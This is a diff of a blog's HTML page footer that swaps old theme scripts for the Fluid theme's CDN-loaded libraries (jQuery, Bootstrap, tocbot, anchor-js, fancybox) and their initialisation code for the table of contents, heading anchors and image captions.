+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
